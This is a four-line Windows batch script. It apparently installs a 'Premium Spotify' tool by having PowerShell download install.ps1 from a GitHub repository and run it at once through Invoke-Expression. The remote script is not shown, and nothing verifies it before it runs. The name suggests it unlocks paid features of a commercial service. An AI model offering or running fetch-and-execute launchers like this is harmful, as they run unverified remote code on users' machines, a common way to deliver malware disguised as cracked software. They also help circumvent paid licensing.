@echo off
powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/CodingByLune/Premium-Spotify/main/install.ps1' | Invoke-Expression}"
pause
exit
